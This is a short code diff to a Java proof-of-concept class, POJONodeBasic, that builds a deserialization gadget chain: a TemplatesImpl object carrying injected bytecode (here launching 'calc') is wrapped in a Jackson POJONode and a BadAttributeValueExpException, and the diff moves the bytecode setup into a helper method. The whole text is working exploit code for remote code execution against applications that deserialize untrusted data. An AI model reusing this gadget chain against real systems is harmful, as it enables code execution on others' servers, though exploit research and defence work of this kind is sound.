@@ -15,12 +15,7 @@ import javax.management.BadAttributeValueExpException;
  */
 public class POJONodeBasic {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("calc");
-
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
-        Utils.setValue(templates , "_name", "gadgets");
-        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         POJONode pojoNode = new POJONode(templates);
         BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
